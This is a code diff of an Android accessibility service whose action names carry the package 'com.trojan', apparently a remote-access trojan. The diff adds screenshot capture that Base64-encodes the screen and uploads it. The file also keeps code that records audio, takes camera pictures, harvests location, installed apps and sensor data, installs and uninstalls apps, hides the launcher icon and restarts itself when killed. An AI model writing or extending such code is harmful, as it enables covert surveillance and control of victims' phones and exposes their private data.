@@ -34,8 +34,9 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
-// --- REMOVED: import android.view.Display; is no longer needed ---
+import android.view.Display;
 import android.view.accessibility.AccessibilityEvent;
+import androidx.annotation.NonNull;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
@@ -57,7 +58,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
     private static final String TAG = "PowerAccessibility";
 
-    // --- Actions (Unchanged) ---
+    // --- Action Strings ---
     public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
     public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
     public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
@@ -97,7 +98,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     private MediaRecorder mediaRecorder;
     private String recordingFilePath;
 
-    // --- onServiceConnected and BroadcastReceiver setup (Unchanged) ---
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -110,7 +110,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
         powerActionReceiver = new PowerActionReceiver();
         IntentFilter filter = new IntentFilter();
-
+        
         // Register all actions
         filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
         filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
@@ -125,7 +125,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
         filter.addAction(ACTION_SET_VOLUME); filter.addAction(ACTION_INSTALL_APP);
         filter.addAction(ACTION_UNINSTALL_APP); filter.addAction(ACTION_TOGGLE_APP_ICON);
-
+        
         registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
         Log.d(TAG, "PowerActionReceiver registered for all actions.");
     }
@@ -168,22 +168,41 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
 
-    // --- UPDATED: takeScreenshot method now launches your ScreenshotActivity ---
+    // --- Media and Core Action Implementations ---
+
     private void takeScreenshot() {
-        // This method now launches the helper activity to perform the screenshot.
-        // This approach works on a wider range of Android versions and aligns
-        // with the project structure you have created.
-        Intent intent = new Intent(this, ScreenshotActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-        Log.i(TAG, "Sent intent to start ScreenshotActivity.");
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            submitDataToServer("screenshot_error", "API not available on Android versions older than 11.");
+            Log.w(TAG, "Screenshot API not available on this device's Android version.");
+            return;
+        }
+
+        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
+            @Override
+            public void onSuccess(@NonNull ScreenshotResult screenshot) {
+                Log.i(TAG, "Screenshot capture was successful.");
+                try {
+                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
+                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
+                    String encodedString = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
+                    submitDataToServer("screenshot", encodedString);
+                    Log.i(TAG, "Screenshot processed and submitted as Base64.");
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to process the captured screenshot.", e);
+                    submitDataToServer("screenshot_error", "Processing failed: " + e.getMessage());
+                }
+            }
+
+            @Override
+            public void onFailure(int errorCode) {
+                Log.e(TAG, "Failed to take screenshot, error code: " + errorCode);
+                submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
+            }
+        });
     }
 
-    // --- takePicture method is correct, it launches your CameraActivity ---
     private void takePicture(int cameraId) {
-        // This method's job is to start the helper activity.
-        // The CameraActivity.java file will be responsible for capturing the image,
-        // compressing it, converting it to Base64, and submitting the data.
         Intent intent = new Intent(this, CameraActivity.class);
         intent.putExtra("camera_id", cameraId);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -191,12 +210,8 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         Log.i(TAG, "Sent intent to start CameraActivity.");
     }
 
-    // --- Audio recording logic is correct, using Netlify Blobs ---
     private void startAudioRecording() {
-        if (mediaRecorder != null) {
-            Log.w(TAG, "Recording already in progress.");
-            return;
-        }
+        if (mediaRecorder != null) return;
         try {
             File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
             File outputFile = File.createTempFile("rec", ".mp3", outputDir);
@@ -215,15 +230,11 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void stopAudioRecording() {
-        if (mediaRecorder == null) {
-            Log.w(TAG, "No active recording to stop.");
-            return;
-        }
+        if (mediaRecorder == null) return;
         try {
             mediaRecorder.stop();
             mediaRecorder.release();
             mediaRecorder = null;
-            Log.i(TAG, "Audio recording stopped. Preparing to upload as Base64.");
             uploadAudioAsBase64(recordingFilePath);
         } catch (RuntimeException e) {
             Log.e(TAG, "Failed to stop recording properly.", e);
@@ -255,8 +266,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
 
-    // --- All other methods remain unchanged below this point ---
-
     @SuppressLint("WakelockTimeout")
     private void wakeUpAndSwipe() {
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -268,162 +277,16 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
             Path swipePath = new Path();
-            swipePath.moveTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.8f);
-            swipePath.lineTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.2f);
+            swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
+            swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
             GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
             gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
             dispatchGesture(gestureBuilder.build(), null, null);
             Log.i(TAG, "Swipe up gesture dispatched.");
         }, 500);
     }
-
-    private void playSound(String url) {
-        if (url == null || url.isEmpty()) return;
-        MediaPlayer mediaPlayer = new MediaPlayer();
-        try {
-            mediaPlayer.setDataSource(url);
-            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
-            mediaPlayer.prepareAsync();
-            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
-            mediaPlayer.setOnCompletionListener(mp -> mp.release());
-        } catch (IOException e) {
-            Log.e(TAG, "Failed to play sound.", e);
-        }
-    }
-
-    private void showImage(String url) {
-        if (url == null || url.isEmpty()) return;
-        Intent intent = new Intent(this, ImageDisplayActivity.class);
-        intent.putExtra("image_url", url);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-    }
-
-    private void setVolume(int level) {
-        if (level < 0 || level > 100 || audioManager == null) return;
-        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
-        int targetVolume = (int) (maxVolume * (level / 100.0f));
-        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
-    }
-
-    private void installApp(String url) {
-        if (url == null || url.isEmpty()) return;
-        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-    }
-
-    private void uninstallApp(String packageName) {
-        if (packageName == null || packageName.isEmpty()) return;
-        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-    }
-
-    private void toggleAppIcon(boolean show) {
-        PackageManager pm = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class);
-        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
-        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
-    }
-
-    private void getAndUploadAppList() {
-        try {
-            PackageManager pm = getPackageManager();
-            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-            JSONObject appMap = new JSONObject();
-            for (ApplicationInfo app : apps) {
-                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                    appMap.put(app.packageName, app.loadLabel(pm).toString());
-                }
-            }
-            submitDataToServer("installed_apps", appMap);
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to get app list.", e);
-            submitDataToServer("app_list_error", "Failed to get app list.");
-        }
-    }
-
-    @SuppressLint("MissingPermission")
-    private void getCurrentLocation() {
-        try {
-            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
-                try {
-                    if (location != null) {
-                        JSONObject locJson = new JSONObject();
-                        locJson.put("latitude", location.getLatitude());
-                        locJson.put("longitude", location.getLongitude());
-                        submitDataToServer("location", locJson);
-                    } else {
-                        submitDataToServer("location", "Not available");
-                    }
-                } catch (JSONException e) {
-                    submitDataToServer("location_error", "JSON creation failed.");
-                }
-            });
-        } catch (SecurityException e) {
-            submitDataToServer("location", "Permission Denied");
-        }
-    }
-
-    private void getSensorData() {
-        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
-        registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector");
-        registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector");
-        registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity");
-        registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer");
-        registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope");
-        registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer");
-        registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity");
-        registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light");
-        registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure");
-    }
-
-    private void registerSensorIfAvailable(int sensorType, String dataType) {
-        Sensor sensor = sensorManager.getDefaultSensor(sensorType);
-        if (sensor != null) {
-            sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
-        } else {
-            submitDataToServer(dataType, "Not available");
-        }
-    }
-
-    @Override
-    public final void onSensorChanged(SensorEvent event) {
-        JSONObject sensorData = new JSONObject();
-        String sensorTypeKey = "";
-        try {
-            int type = event.sensor.getType();
-            if (type == Sensor.TYPE_ROTATION_VECTOR || type == Sensor.TYPE_GAME_ROTATION_VECTOR || type == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) {
-                sensorTypeKey = (type == Sensor.TYPE_ROTATION_VECTOR) ? "rotation_vector" : (type == Sensor.TYPE_GAME_ROTATION_VECTOR) ? "game_rotation_vector" : "geomagnetic_rotation_vector";
-                sensorData.put("x", event.values[0]);
-                sensorData.put("y", event.values[1]);
-                sensorData.put("z", event.values[2]);
-                if (event.values.length > 3) sensorData.put("w", event.values[3]);
-            } else if (type == Sensor.TYPE_GRAVITY || type == Sensor.TYPE_ACCELEROMETER || type == Sensor.TYPE_GYROSCOPE || type == Sensor.TYPE_MAGNETIC_FIELD) {
-                sensorTypeKey = (type == Sensor.TYPE_GRAVITY) ? "gravity" : (type == Sensor.TYPE_ACCELEROMETER) ? "accelerometer" : (type == Sensor.TYPE_GYROSCOPE) ? "gyroscope" : "magnetometer";
-                sensorData.put("x", event.values[0]);
-                sensorData.put("y", event.values[1]);
-                sensorData.put("z", event.values[2]);
-            } else if (type == Sensor.TYPE_PROXIMITY) {
-                sensorTypeKey = "proximity";
-                sensorData.put("distance", event.values[0]);
-            } else if (type == Sensor.TYPE_LIGHT) {
-                sensorTypeKey = "light";
-                sensorData.put("lux", event.values[0]);
-            } else if (type == Sensor.TYPE_PRESSURE) {
-                sensorTypeKey = "pressure";
-                sensorData.put("pressure", event.values[0]);
-            }
-            if (!sensorTypeKey.isEmpty()) {
-                submitDataToServer(sensorTypeKey, sensorData);
-            }
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error on sensor changed.", e);
-        } finally {
-            sensorManager.unregisterListener(this, event.sensor);
-        }
-    }
+    
+    // --- Helper and Utility Methods ---
 
     private void submitDataToServer(String dataType, Object payload) {
         JSONObject postData = new JSONObject();
@@ -441,66 +304,64 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             Log.e(TAG, "Could not create submission JSON", e);
         }
     }
-
-    private void getBatteryStatus() {
-        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent status = registerReceiver(null, filter);
-        if (status == null) return;
+    
+    private void playSound(String url) { if (url == null || url.isEmpty()) return; MediaPlayer mediaPlayer = new MediaPlayer(); try { mediaPlayer.setDataSource(url); mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC); mediaPlayer.prepareAsync(); mediaPlayer.setOnPreparedListener(MediaPlayer::start); mediaPlayer.setOnCompletionListener(mp -> mp.release()); } catch (IOException e) { Log.e(TAG, "Failed to play sound.", e); } }
+    private void showImage(String url) { if (url == null || url.isEmpty()) return; Intent intent = new Intent(this, ImageDisplayActivity.class); intent.putExtra("image_url", url); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); }
+    private void setVolume(int level) { if (level < 0 || level > 100 || audioManager == null) return; int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC); int targetVolume = (int) (maxVolume * (level / 100.0f)); audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0); }
+    private void installApp(String url) { if (url == null || url.isEmpty()) return; Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url)); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); }
+    private void uninstallApp(String packageName) { if (packageName == null || packageName.isEmpty()) return; Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName)); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); }
+    private void toggleAppIcon(boolean show) { PackageManager pm = getPackageManager(); ComponentName componentName = new ComponentName(this, MainActivity.class); int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED; pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP); }
+    private void getAndUploadAppList() { try { PackageManager pm = getPackageManager(); List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA); JSONObject appMap = new JSONObject(); for (ApplicationInfo app : apps) { if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) { appMap.put(app.packageName, app.loadLabel(pm).toString()); } } submitDataToServer("installed_apps", appMap); } catch (Exception e) { Log.e(TAG, "Failed to get app list.", e); submitDataToServer("app_list_error", "Failed to get app list."); } }
+    @SuppressLint("MissingPermission") private void getCurrentLocation() { try { fusedLocationClient.getLastLocation().addOnSuccessListener(location -> { try { if (location != null) { JSONObject locJson = new JSONObject(); locJson.put("latitude", location.getLatitude()); locJson.put("longitude", location.getLongitude()); submitDataToServer("location", locJson); } else { submitDataToServer("location", "Not available"); } } catch (JSONException e) { submitDataToServer("location_error", "JSON creation failed."); } }); } catch (SecurityException e) { submitDataToServer("location", "Permission Denied"); } }
+    private void getSensorData() { registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector"); registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector"); registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector"); registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity"); registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer"); registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope"); registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer"); registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity"); registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light"); registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure"); }
+    private void registerSensorIfAvailable(int sensorType, String dataType) { Sensor sensor = sensorManager.getDefaultSensor(sensorType); if (sensor != null) { sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL); } else { submitDataToServer(dataType, "Not available"); } }
+    private void getBatteryStatus() { IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED); Intent status = registerReceiver(null, filter); if (status == null) return; try { int level = status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1); int scale = status.getIntExtra(BatteryManager.EXTRA_SCALE, -1); float pct = (scale > 0) ? (level * 100 / (float) scale) : -1f; int chargeStatus = status.getIntExtra(BatteryManager.EXTRA_STATUS, -1); boolean isCharging = (chargeStatus == BatteryManager.BATTERY_STATUS_CHARGING || chargeStatus == BatteryManager.BATTERY_STATUS_FULL); JSONObject batteryJson = new JSONObject(); batteryJson.put("percentage", pct); batteryJson.put("isCharging", isCharging); submitDataToServer("battery_status", batteryJson); } catch (JSONException e) { Log.e(TAG, "Error creating battery JSON."); } }
+    private void getScreenStatus() { PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE); submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off"); }
+    private void openSettingsPanel(String settingsAction) { startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); }
+    private void openApp(String packageName) { if (packageName == null) return; Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName); if (launchIntent != null) { startActivity(launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); } }
+    
+    // --- Service Lifecycle and Sensor Callbacks ---
+    
+    @Override
+    public final void onSensorChanged(SensorEvent event) {
+        JSONObject sensorData = new JSONObject();
+        String sensorTypeKey = "";
         try {
-            int level = status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = status.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            float pct = (scale > 0) ? (level * 100 / (float) scale) : -1f;
-            int chargeStatus = status.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-            boolean isCharging = (chargeStatus == BatteryManager.BATTERY_STATUS_CHARGING || chargeStatus == BatteryManager.BATTERY_STATUS_FULL);
-            JSONObject batteryJson = new JSONObject();
-            batteryJson.put("percentage", pct);
-            batteryJson.put("isCharging", isCharging);
-            submitDataToServer("battery_status", batteryJson);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating battery JSON.");
-        }
+            int type = event.sensor.getType();
+            if (type == Sensor.TYPE_ROTATION_VECTOR || type == Sensor.TYPE_GAME_ROTATION_VECTOR || type == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) { sensorTypeKey = (type == Sensor.TYPE_ROTATION_VECTOR) ? "rotation_vector" : (type == Sensor.TYPE_GAME_ROTATION_VECTOR) ? "game_rotation_vector" : "geomagnetic_rotation_vector"; sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]); if (event.values.length > 3) sensorData.put("w", event.values[3]); } 
+            else if (type == Sensor.TYPE_GRAVITY || type == Sensor.TYPE_ACCELEROMETER || type == Sensor.TYPE_GYROSCOPE || type == Sensor.TYPE_MAGNETIC_FIELD) { sensorTypeKey = (type == Sensor.TYPE_GRAVITY) ? "gravity" : (type == Sensor.TYPE_ACCELEROMETER) ? "accelerometer" : (type == Sensor.TYPE_GYROSCOPE) ? "gyroscope" : "magnetometer"; sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]); } 
+            else if (type == Sensor.TYPE_PROXIMITY) { sensorTypeKey = "proximity"; sensorData.put("distance", event.values[0]); } 
+            else if (type == Sensor.TYPE_LIGHT) { sensorTypeKey = "light"; sensorData.put("lux", event.values[0]); } 
+            else if (type == Sensor.TYPE_PRESSURE) { sensorTypeKey = "pressure"; sensorData.put("pressure", event.values[0]); }
+            if (!sensorTypeKey.isEmpty()) { submitDataToServer(sensorTypeKey, sensorData); }
+        } catch (JSONException e) { Log.e(TAG, "JSON error on sensor changed.", e); } 
+        finally { sensorManager.unregisterListener(this, event.sensor); }
     }
-
-    private void getScreenStatus() {
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
-    }
-
-    private void openSettingsPanel(String settingsAction) {
-        startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-    }
-
-    private void openApp(String packageName) {
-        if (packageName == null) return;
-        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
-        if (launchIntent != null) {
-            startActivity(launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-        }
-    }
-
+    
     @Override public void onAccuracyChanged(Sensor sensor, int accuracy) {}
-
+    
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
             lastForegroundAppPkg = event.getPackageName().toString();
         }
     }
-
+    
     @Override public void onInterrupt() { Log.w(TAG, "Service interrupted."); }
-
+    
     @Override
     public boolean onUnbind(Intent intent) {
         if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
         if (sensorManager != null) sensorManager.unregisterListener(this);
         return super.onUnbind(intent);
     }
-
+    
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
         PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        ((AlarmManager) getSystemService(Context.ALARM_SERVICE)).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        alarmManager.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
         super.onTaskRemoved(rootIntent);
     }
 }
